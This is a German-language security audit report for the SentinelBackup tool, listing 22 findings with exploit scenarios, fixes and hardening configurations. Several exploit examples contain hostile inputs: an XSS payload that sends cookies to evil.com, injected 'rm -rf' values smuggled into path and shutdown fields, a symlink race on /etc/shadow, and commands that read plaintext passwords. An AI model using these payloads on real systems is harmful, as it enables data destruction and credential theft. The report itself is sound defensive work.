# SentinelBackup – Security Audit Report
## Version: 1.2.0 | Datum: 2026-08-31 | Auditor: Prostetnik (Security-Analyst)

---

## Zusammenfassung

SentinelBackup weist **mehrere kritische Sicherheitslücken** auf, die unter realen Bedingungen zu einer vollständigen Systemkompromittierung führen können. Die schwerwiegendsten Probleme sind:

1. **Fehlende Authentifizierung** – Jeder im Netzwerk kann das Dashboard nutzen, Backups steuern, Server hinzufügen und System-Updates auslösen.
2. **Command Injection** via Datenbankfelder (flag_path, ssh_shutdown_cmd) – Ein manipulierter Eintrag führt sofort zur Remote-Code-Execution als root.
3. **Klartext-Passwörter** in SQLite (NAS-Passwort, MySQL-Passwort auf Agenten) ohne Verschlüsselung.
4. **SSH HostKey-Checking deaktiviert** – MITM-Angriffe auf alle SSH-Verbindungen möglich.
5. **Kein HTTPS / keine Rate-Limiting** – Abhörbar, CSRF-anfällig, brute-force-empfindlich.
6. **XSS** via unescaped Diagnose-Ausgaben in der Web-UI.

---

## Issue-Tabelle (nach Severity sortiert)

| ID | Komponente | Severity | Titel | CVSS-äquivalent |
|---|---|---|---|---|
| SB-001 | app.py / Gesamtsystem | **Critical** | Keine Authentifizierung & Autorisierung | 9.8 |
| SB-002 | orchestrator.py | **Critical** | Command Injection via Server.flag_path & Server.backup_path | 9.1 |
| SB-003 | orchestrator.py | **Critical** | Command Injection via NasConfig.ssh_shutdown_cmd | 9.1 |
| SB-004 | install.sh / Nginx | **Critical** | Kein HTTPS / TLS, keine Security-Header | 8.2 |
| SB-005 | models.py / SQLite | **Critical** | NAS- & MySQL-Passwörter in Klartext in Datenbank | 8.1 |
| SB-006 | app.py | **High** | Reflektierte XSS via NAS-Test-Dialog & SMB-Fehlermeldungen | 7.1 |
| SB-007 | orchestrator.py / SSH | **High** | StrictHostKeyChecking=no für alle SSH-Verbindungen | 7.4 |
| SB-008 | app.py | **High** | NAS-Test übergibt Passwort an smbclient auf Kommandozeile (ps-lesbar) | 7.2 |
| SB-009 | orchestrator.py | **High** | Symlink-Angriff auf /tmp/sentinel.lock und /tmp/sbtcifscreds | 7.0 |
| SB-010 | install.sh / Berechtigungen | **High** | www-data erhält Lese-/Schreibrecht auf gesamtes /opt/sentinelbackup | 6.8 |
| SB-011 | update.sh | **High** | Update-Skript ohne Signaturprüfung / keine Rollback-Möglichkeit | 6.5 |
| SB-012 | app.py | **High** | Kein CSRF-Schutz – HTMX-POSTs können von externen Seiten getriggert werden | 6.4 |
| SB-013 | orchestrator.py | **High** | Ein SSH-Key für alle Server + NAS (lateral movement) | 6.3 |
| SB-014 | app.py | **Medium** | Kein Rate-Limiting – Brute-Force / DoS möglich | 5.3 |
| SB-015 | setup_agent.sh | **Medium** | MySQL-Passwort temporär in /tmp/.sb_mysql.cnf (Race Condition) | 5.0 |
| SB-016 | setup_agent.sh | **Medium** | Word-Splitting bei DB_NAMES und DIRS in Custom-Modus | 4.8 |
| SB-017 | app.py | **Medium** | Keine Input-Validierung bei IP, Hostname, Pfad, Port | 4.5 |
| SB-018 | orchestrator.py | **Medium** | Ausführliche Befehls-Logging könnte Pfade mit sensitiven Daten loggen | 4.0 |
| SB-019 | install.sh | **Low** | SSH-Key ohne Passphrase generiert | 3.5 |
| SB-020 | app.py | **Low** | update.sh akzeptiert beliebige Versionsstrings ohne Format-Validierung | 3.3 |
| SB-021 | SQLite | **Low** | Datenbank selbst wird nicht gebackupt | 2.5 |
| SB-022 | Nginx | **Low** | Keine client_max_body_size / Upload-Limits | 2.0 |

---

## Detaillierte Analyse & Exploit-Szenarien

---

### SB-001 – Keine Authentifizierung & Autorisierung
**Severity:** Critical | **Komponente:** app.py / Gesamtsystem

#### Beschreibung
Keine einzige Route ist durch Login, Session-Cookie, API-Key oder IP-Whitelist geschützt.

#### Exploit
```bash
# Jeder im gleichen Netzwerk kann:
curl -X POST http://sentinelbackup/servers/add \
  -d "hostname=pwned&ip=10.0.0.99&backup_path=/etc&flag_path=/tmp/done"

# Backup-Zyklus triggern:
curl -X POST http://sentinelbackup/api/trigger_engine

# Update auf bösartige Version erzwingen:
curl -X POST http://sentinelbackup/api/start_update \
  -d "target_version=v1.0.0-malicious"

# NAS-Passwort auslesen (SQLite liegt im Dateisystem):
curl http://sentinelbackup/../../database.db
```

#### Fix
- **Sofort:** Flask-Login oder Basic-Auth implementieren.
- **Mittelfristig:** Rollenbasierte Zugriffskontrolle (Admin vs. Viewer).
- **Empfohlen:** IP-Whitelist als Notfall-Brake im Nginx.

---

### SB-002 – Command Injection via Server-Metadaten
**Severity:** Critical | **Komponente:** orchestrator.py

#### Beschreibung
`server.flag_path`, `server.backup_path` und `server.ssh_user`/`server.ip` werden unescaped in SSH-Remote-Commands und rsync-Argumenten verwendet.

#### Quellcode (engine/orchestrator.py)
```python
cmd = [
    "ssh", "-i", SSH_KEY, "-p", str(server.ssh_port),
    "-o", "StrictHostKeyChecking=no",
    f"{server.ssh_user}@{server.ip}",
    f"test -f {server.flag_path}",  # ← Injection!
]
```

#### Exploit
Angreifer fügt über die Web-UI einen Server hinzu mit:
```
flag_path = /tmp/x`; rm -rf /etc; echo `
```
Der resultierende Befehl auf dem Zielserver:
```bash
test -f /tmp/x`; rm -rf /etc; echo `
```
Dies führt zu **Remote Code Execution** auf jedem Backup-Zielserver.

#### Fix
```python
import shlex
remote_cmd = f"test -f {shlex.quote(server.flag_path)}"
```
Für rsync: Alle Pfade müssen durch `shlex.quote()` gejagt werden oder rsync mit `--protect-args` genutzt werden.

---

### SB-003 – Command Injection via NAS Shutdown-Kommando
**Severity:** Critical | **Komponente:** orchestrator.py

#### Beschreibung
`nas.ssh_shutdown_cmd` wird direkt als Remote-Command an SSH übergeben.

#### Quellcode
```python
shutdown_cmd = [
    "ssh", "-i", SSH_KEY, "-o", "StrictHostKeyChecking=no",
    "-p", str(nas.ssh_port),
    f"{nas.user}@{nas.ip}",
    nas.ssh_shutdown_cmd,  # ← Injection!
]
```

#### Exploit
```
ssh_shutdown_cmd = sudo synoshutdown --shutdown; rm -rf /volume1/*
```

#### Fix
Shutdown-Cmd auf eine Whitelist erlaubter Befehle beschränken oder mit `shlex.quote()` escapen.

---

### SB-004 – Kein HTTPS / TLS
**Severity:** Critical | **Komponente:** install.sh (Nginx-Config)

#### Beschreibung
Die generierte Nginx-Konfiguration lauscht ausschließlich auf HTTP (Port 80). Es gibt keine TLS-Terminierung, keine Weiterleitung auf HTTPS und keine Security-Header.

#### Exploit
- Passives Abhören im LAN: NAS-Passwort, Server-Konfiguration, Update-Trigger im Klartext.
- Session-Hijacking wenn zukünftig Auth-Cookies eingeführt werden.
- Man-in-the-Middle-Angriff auf den Update-Prozess.

#### Fix
```nginx
# 1. HTTP auf HTTPS umleiten
server {
    listen 80 default_server;
    return 301 https://$host$request_uri;
}

# 2. HTTPS-Server
server {
    listen 443 ssl http2;
    ssl_certificate /etc/ssl/certs/sentinelbackup.crt;
    ssl_certificate_key /etc/ssl/private/sentinelbackup.key;
    ssl_protocols TLSv1.3;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Content-Security-Policy "default-src 'self'" always;
    ...
}
```

---

### SB-005 – Klartext-Passwörter in SQLite
**Severity:** Critical | **Komponente:** models.py / SQLite

#### Beschreibung
`NasConfig.password` und auf den Agent-Servern `DB_PASS` werden unverschlüsselt gespeichert.

#### Exploit
```bash
# Als www-data oder root:
sqlite3 /opt/sentinelbackup/database.db "SELECT password FROM nas_config;"
# → Klartext-Passwort für NAS-CIFS-Share

cat /opt/sentinel_agent/.env
# → MySQL Root-Passwort
```

#### Fix
- NAS-Passwort: In Umgebungsvariable oder OS-Keyring (z.B. `pass`, `secret-tool`) auslagern.
- Mindestens: **Fernet-Verschlüsselung** mit Master-Key aus `/etc/sentinelbackup/key` (chmod 400, root-only).
- Agenten: Passwort in `~root/.my.cnf` dauerhaft speichern (mode 600) statt in `.env`.

---

### SB-006 – Reflektierte XSS via NAS-Test-Dialog
**Severity:** High | **Komponente:** app.py

#### Beschreibung
`_nas_diag_list()` und `_translate_smb_error()` bauen HTML direkt zusammen, ohne User-Input zu escapen.

#### Quellcode
```python
def _nas_diag_list(steps):
    items = []
    for ok, text in steps:
        items.append(f'<li class="list-group-item {cls}">{icon} {text}</li>')
    return '<ul class="list-group list-group-flush">' + "".join(items) + '</ul>'
```

#### Exploit
1. Angreifer konfiguriert NAS mit `password = '<script>fetch("https://evil.com/?c="+document.cookie)</script>'`.
2. Klickt "Testen".
3. XSS-Payload wird in den DOM gerendert.

#### Fix
```python
from html import escape
def _nas_diag_list(steps):
    ...
    items.append(f'<li class="...">{icon} {escape(text)}</li>')
```

---

### SB-007 – StrictHostKeyChecking=no
**Severity:** High | **Komponente:** orchestrator.py

#### Beschreibung
Alle SSH-Verbindungen (Server-Check, rsync, NAS-Shutdown) verwenden `StrictHostKeyChecking=no`. Der SSH-Client akzeptiert jeden Host-Key ohne Bestätigung.

#### Exploit
Angreifer im selben Netzwerk (ARP-Spoofing, Rogue DHCP, DNS-Poisoning) kann eine Maschine mit der IP des Backup-Ziels hochfahren. SentinelBackup verbindet sich blind, übergibt den privaten Key und führt Befehle auf der Angreifer-Maschine aus.

#### Fix
```python
"-o", "StrictHostKeyChecking=accept-new",
"-o", f"UserKnownHostsFile=/opt/sentinelbackup/known_hosts/{server.hostname}",
```
Und: Host-Keys beim ersten Setup über einen gesicherten Kanal (QR-Code, out-of-band) aufnehmen.

---

### SB-008 – NAS-Passwort in Prozessliste sichtbar
**Severity:** High | **Komponente:** app.py (`test_nas()`)

#### Quellcode
```python
cmd = [
    "smbclient", share_path, "-m", "SMB3",
    "-U", f"{user}%{password}",  # ← ps aux!
    "-c", "ls",
]
```

#### Exploit
```bash
ps aux | grep smbclient
# → backupuser%SuperSecret123
```

#### Fix
`SMBCLIENT_PASSWORD` Umgebungsvariable verwenden oder `-A` mit Credentials-Datei (temporär, 600).

---

### SB-009 – Symlink-Angriff auf /tmp-Dateien
**Severity:** High | **Komponente:** orchestrator.py

#### Beschreibung
`LOCK_FILE = "/tmp/sentinel.lock"` und `CIFS_CREDS_FILE = "/tmp/sbtcifscreds"` liegen in einem world-writable Verzeichnis.

#### Exploit (Race Condition)
```bash
while true; do
    ln -s /etc/shadow /tmp/sentinel.lock 2>/dev/null
done
```

#### Fix
- Lockfile nach `/run/sentinelbackup/sentinel.lock`.
- CIFS-Creds nach `/run/sentinelbackup/sbtcifscreds` mit `RuntimeDirectory=` in der Systemd-Unit.

---

### SB-010 – www-data hat volle Rechte auf /opt/sentinelbackup
**Severity:** High | **Komponente:** install.sh

#### Beschreibung
```bash
chown -R www-data:www-data /opt/sentinelbackup/
```

#### Exploit
www-data kann Engine-Skripte manipulieren → Code-Execution als root.

#### Fix
```bash
chown -R root:root /opt/sentinelbackup/
chown www-data:www-data /opt/sentinelbackup/database.db
chmod 640 /opt/sentinelbackup/database.db
```

---

### SB-011 – Update ohne Signaturprüfung
**Severity:** High | **Komponente:** update.sh

#### Beschreibung
```bash
DOWNLOAD_URL="https://github.com/wrkdrvn/SentinelBackup/archive/refs/tags/${1}.tar.gz"
curl -fsSL --retry 3 -o "${TMP_TARBALL}" "${DOWNLOAD_URL}"
```

#### Exploit
Kompromittierte GitHub-Account oder DNS-Hijacking → Download manipulierter Code.

#### Fix
1. Release-Tarballs mit GPG signieren.
2. SHA256-Summe prüfen.

---

### SB-012 – Kein CSRF-Schutz
**Severity:** High | **Komponente:** app.py

#### Beschreibung
Alle POST-Endpoints prüfen keinen CSRF-Token.

#### Exploit
```html
<form action="http://sentinelbackup/api/trigger_engine" method="POST"></form>
```

#### Fix
Flask-WTF mit CSRF-Token in HTMX-Requests (`hx-headers`).

---

### SB-013 – Ein SSH-Key für alle Server + NAS
**Severity:** High | **Komponente:** install.sh / orchestrator.py

#### Beschreibung
Ein einzelner ED25519-Key (`/root/.ssh/id_ed25519`) wird für alle Backup-Ziele und die NAS genutzt.

#### Exploit
Kompromittierung eines einzigen Servers = Zugang zu allen anderen + NAS.

#### Fix
- Pro Server ein dedizierter Key-Paar (`/opt/sentinelbackup/keys/<hostname>`).
- NAS bekommt eigenen Key.

---

### SB-014 – Kein Rate-Limiting
**Severity:** Medium | **Komponente:** app.py / Nginx

#### Fix
```nginx
limit_req_zone $binary_remote_addr zone=sb:10m rate=10r/s;
limit_req zone=sb burst=20 nodelay;
```

---

### SB-015 – MySQL-Passwort in /tmp/.sb_mysql.cnf
**Severity:** Medium | **Komponente:** setup_agent.sh

#### Beschreibung
Die temporäre `.my.cnf` wird in `/tmp` erstellt. World-writable Verzeichnis.

#### Fix
```bash
MYSQL_CNF="/root/.sb_mysql.cnf"
```

---

### SB-016 – Word-Splitting in Custom-Modus
**Severity:** Medium | **Komponente:** setup_agent.sh

#### Beschreibung
```bash
for db in $(echo "$DB_NAMES" | tr ',' ' '); do
```
Wenn `DB_NAMES` Leerzeichen enthält, splittet die Shell.

#### Fix
```bash
IFS=',' read -ra DB_ARRAY <<< "$DB_NAMES"
for db in "${DB_ARRAY[@]}"; do ...
```

---

### SB-017 – Keine Input-Validierung
**Severity:** Medium | **Komponente:** app.py

#### Beschreibung
IP, Hostname, Pfade, Ports werden nicht validiert.

#### Fix
- IP: `ipaddress.ip_address()`
- Port: Range 1-65535
- Hostname: `re.match(r'^[a-zA-Z0-9._-]+$')`
- Pfade: `os.path.isabs()` und `..`-Filter

---

### SB-018 – Logging könnte sensitive Daten enthalten
**Severity:** Medium | **Komponente:** orchestrator.py

#### Beschreibung
```python
logger.info(f"AUSFUEHRUNG RSYNC: {' '.join(cmd)}")
```
Wenn ein Feld (z.B. backup_path) ein Passwort enthält, wird es geloggt.

#### Fix
Sensitive Felder vor dem Logging maskieren.

---

### SB-019 – SSH-Key ohne Passphrase
**Severity:** Low | **Komponente:** install.sh

#### Beschreibung
```bash
ssh-keygen -t ed25519 -f "${SSH_KEY}" -N ""
```

#### Fix
Optional eine Passphrase setzen und mit `ssh-agent` arbeiten (schwierig in Daemon-Kontext). Oder Key mit `chmod 400` und 2FA für den root-Account.

---

### SB-020 – Keine Versionsstring-Validierung
**Severity:** Low | **Komponente:** app.py / update.sh

#### Fix
```python
import re
if not re.match(r'^v\d+\.\d+\.\d+$', target_version):
    abort(400, "Ungültiges Versionsformat")
```

---

### SB-021 – Datenbank selbst wird nicht gebackupt
**Severity:** Low | **Komponente:** models.py / SQLite

#### Fix
Täglicher SQLite-Dump nach `/opt/sentinelbackup/backups/db/`.

---

### SB-022 – Keine Upload-Limits
**Severity:** Low | **Komponente:** Nginx

#### Fix
```nginx
client_max_body_size 1m;
```

---

## Priorisierte Fix-Roadmap

### Phase 1 – Sofort (Critical, 0-48h)
1. **Authentifizierung** einbauen (Flask-Login mit Session-Cookies).
2. **Command Injection** fixen: `shlex.quote()` auf ALLE User-Inputs, die in Shell-Kommandos landen.
3. **XSS** fixen: `html.escape()` bei `_nas_diag_list()` und `_translate_smb_error()`.
4. **SSH-Key-Checking** auf `accept-new` umstellen.
5. **Nginx:** `client_max_body_size`, `limit_req`, Basic-Auth als Notfall-Brake.
6. **Berechtigungen:** `/opt/sentinelbackup` auf `root:root` stellen, nur DB auf `www-data:640`.

### Phase 2 – Kurzfristig (High, 1 Woche)
7. HTTPS mit Let's Encrypt oder self-signed TLS.
8. NAS-Passwort verschlüsseln (Fernet + Master-Key) oder in Keyring auslagern.
9. `/tmp`-Dateien nach `/run/sentinelbackup/` verschieben (systemd `RuntimeDirectory`).
10. smbclient Passwort über Umgebungsvariable oder Credentials-File.
11. CSRF-Token für alle POST-Endpoints.
12. Update-Prozess: GPG-Signatur + SHA256-Prüfung.

### Phase 3 – Mittelfristig (Medium, 2-4 Wochen)
13. Dedizierte SSH-Keys pro Server + NAS.
14. Input-Validierung (IP, Hostname, Port, Pfad).
15. Rate-Limiting im Nginx für alle Endpoints.
16. SQLite-Verschlüsselung (SQLCipher) oder Migration zu PostgreSQL.
17. Datenbank-Backup-Mechanismus.
18. Logging auditieren und sensitive Daten maskieren.

### Phase 4 – Langfristig (Optional)
19. Zwei-Faktor-Authentifizierung für Web-UI.
20. API-Key-basierte Authentifizierung für externe Trigger.
21. Audit-Log für alle Admin-Aktionen.
22. Sichere Credential-Storage mit Vault (HashiCorp Vault, Sealed Secrets).

---

## Konfigurations-Härtungsempfehlungen

### Nginx (Härte-Paket)
```nginx
server {
    listen 443 ssl http2;
    server_name sentinelbackup.lan;

    ssl_certificate /etc/ssl/certs/sentinelbackup.crt;
    ssl_certificate_key /etc/ssl/private/sentinelbackup.key;
    ssl_protocols TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    # Security Headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # Rate Limiting
    limit_req_zone $binary_remote_addr zone=sb:10m rate=10r/s;
    limit_req zone=sb burst=20 nodelay;

    # Proxy
    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    client_max_body_size 1m;
}
```

### Systemd-Unit Härtung (sentinelbackup-engine.service)
```ini
[Service]
User=root
Group=root
RuntimeDirectory=sentinelbackup
RuntimeDirectoryMode=0700
# Lock + Creds landen jetzt unter /run/sentinelbackup/
Environment="SENTINEL_LOG_LEVEL=INFO"
WorkingDirectory=/opt/sentinelbackup/backend
ExecStart=/opt/sentinelbackup/venv/bin/python3 -u /opt/sentinelbackup/backend/engine/orchestrator.py
Restart=always
RestartSec=10

# Härten
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/opt/sentinelbackup/cache /var/log/sentinelbackup /run/sentinelbackup
ProtectKernelTunables=true
ProtectKernelModules=true
ProtectControlGroups=true
```

### Firewall (ufw / iptables)
```bash
# Nur HTTPS aus dem LAN erlauben
ufw default deny incoming
ufw allow from 192.168.0.0/16 to any port 443 proto tcp
ufw allow from 10.0.0.0/8 to any port 443 proto tcp
# SSH (für Backup-Ziele) nur von localhost / managemement-Netz
ufw allow from 192.168.1.0/24 to any port 22 proto tcp
```

### Dateisystem-Berechtigungen
```bash
# Besitz
chown -R root:root /opt/sentinelbackup/
chown www-data:www-data /opt/sentinelbackup/database.db
chmod 640 /opt/sentinelbackup/database.db

# SSH-Keys streng
chmod 700 /root/.ssh
chmod 600 /root/.ssh/id_ed25519
chmod 644 /root/.ssh/id_ed25519.pub

# Agent-Keys separat
mkdir -p /opt/sentinelbackup/keys
chmod 700 /opt/sentinelbackup/keys
```

---

## Fazit

SentinelBackup ist für ein lokales, vertrauenswürdiges LAN-Netzwerk konzipiert. In dieser Konfiguration sind **keinerlei Sicherheitsmechanismen** implementiert, die einen auch nur halbwegs motivierten Angreifer aufhalten würden.

**Empfehlung:** Die **Phase-1-Fixes** (Auth, Command Injection, XSS, SSH-Checking, Rechte) sollten **vor jeglichem Deployment in einer produktiven Umgebung** umgesetzt werden. Bis dahin ist SentinelBackup ausschließlich für isolierte Testumgebungen ohne sensible Daten geeignet.

---
*Audit durchgeführt von Prostetnik | Datum: 2026-08-31*
